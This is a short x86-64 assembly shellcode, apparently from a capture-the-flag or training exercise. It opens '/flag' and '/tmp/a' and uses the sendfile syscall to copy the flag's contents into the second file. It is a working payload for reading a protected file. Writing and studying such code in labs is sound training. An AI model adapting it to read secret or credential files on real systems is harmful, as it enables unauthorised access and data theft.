.global _start
.intel_syntax noprefix

_start:
	mov rax, 2
	mov rbx, 0x0067616c662f
	push rbx
	lea rdi, [rsp]
	mov rsi, 0
	syscall
	mov r9, rax

	mov rax, 2
	mov rbx, 0x00612f706d742f
	push rbx
	lea rdi, [rsp]
	mov rsi, 1
	syscall
	mov r12, rax
	jmp here
flag:
	.string "/flag"
out:
	.string "/home/hacker/shellcode/out"
here:
	mov rax, 40
	mov rdi, r12
	mov rsi, r9
	mov rdx, 0
	mov r10, 255
	syscall

	mov rax, 60
	syscall

